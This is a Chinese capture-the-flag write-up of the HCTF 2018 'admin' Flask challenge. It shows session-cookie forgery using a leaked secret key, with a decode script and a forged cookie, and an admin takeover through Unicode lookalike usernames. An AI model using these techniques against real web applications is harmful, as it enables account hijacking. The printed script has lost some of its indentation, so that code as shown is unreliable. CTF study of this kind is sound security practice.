# [HCTF 2018]admin
TAG:flasksession欺骗，unicode欺骗  
## 解题过程：
![20210108111301](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111301.png)  
在注册页面可知存在admin账户：  
![20210108111343](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111343.png)  
![20210108111353](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111353.png)  
随意注册一个账户进行登陆，登陆后出现了几个页面  
![20210108111411](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111411.png)  
```Index：```  
![20210108111821](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111821.png)  
```Post:```  
![20210108111907](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111907.png)  
```Change password:```   
![20210108111930](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108111930.png)  
在```change password```页面的源码中可以发现源码地址  
![20210108112006](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112006.png)  
源代码： https://github.com/woadsl1234/hctf_flask/  
![20210108112026](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112026.png)  
进行代码审计，获得以下信息：  
1. flask  
![20210108112055](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112055.png)  
2. secret_key  
![20210108112113](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112113.png)  
3. 拥有admin_session可获得flag    
![20210108112136](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112136.png)  
4. 隐患函数strlower()  
![20210108112205](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112205.png)
  
### 解法1：flask session欺骗  
解密flask session脚本：  
```
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode
def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)
decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True
try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')
if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')
return session_json_serializer.loads(payload)
if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```
  
加密flask session脚本：https://github.com/noraj/flask-session-cookie-manager  
1.随意注册一个账户并登陆，获取cookie  
![20210108112506](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112506.png)  
2.使用脚本解密，将name改为admin，替换原cookie  
![20210108112529](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112529.png)  
```
{'_fresh': True, '_id': b'640bdeac45f7ddb2205c182ba41de0f58b1cf7610890a8146380e9a4c37c66980bad9dddea0e781563b7593ff7e7451a45cf6d7f655903f853f87522cb702dbf', 'csrf_token': b'f5f2e566637accb5a15abdfa44cfa9704033b865', 'image': b'nx36', 'name': 'test', 'user_id': '10'}
-->
{'_fresh': True, '_id': b'640bdeac45f7ddb2205c182ba41de0f58b1cf7610890a8146380e9a4c37c66980bad9dddea0e781563b7593ff7e7451a45cf6d7f655903f853f87522cb702dbf', 'csrf_token': b'f5f2e566637accb5a15abdfa44cfa9704033b865', 'image': b'nx36', 'name': 'admin', 'user_id': '10'}
```
![20210108112557](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112557.png)  
新的cookiesession:  
```
.eJw9kMGOgjAQhl9l07MHrHAx8aApEk1mCKSVtBeDiNBhyyaowcX47tu4ied_5vtm_ic7Xob62rLlbbjXM3a0Z7Z8sq8TWzKkbNQu_9YFBFjohUlyC7QbsYBHKvZWy-xhEjUaUqGmLRmqOMh1mMpNm4o4QIIQEhVpmRNMZ0LSUSo2VhdZ5FmdKeLRyCoEqTjw3QJlNxnnPbIKUG5bFAfPNB1yzVGqCAS6VKjJUONnd7_a74DYd9rpFXvNWHUdLsfbT1f3nxcMHRw4Nfdq7k9oPchiET-w2FqTGK_Iybg4wmkdgIBJU8MxW71x1pVN_SGd-mbC5j_pS-cDVp6d7dmM3a_18O6NzQP2-gN6kGwg.XlCyMQ.wh72jp_Zz5qFgW6YZP0hAVl8ZR4
```  
3.刷新后获得flag  
![20210108112711](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112711.png)  
参考：[Python Web之flask session&格式化字符串漏洞](https://xz.aliyun.com/t/3569)  
### 解法2：unicode欺骗  
在处理用户输入的账户名时，使用了自定义的```strlower()```而不是python自带的```lower()```  
![20210108112844](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108112844.png)  
简单的测试一下这个函数，当使用unicode编码输入文字时，会产生unicode欺骗漏洞 
```
ᴬᴰᴹᴵᴺ -> ADMIN -> admin
```
1. 注册一个名为```ᴬᴰᴹᴵᴺ```的账户  
![20210108113006](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108113006.png)  
2. 修改密码  
![20210108113030](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108113030.png)  
3. 用修改后的密码登陆admin账户获得flag  
![20210108113050](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108113050.png)  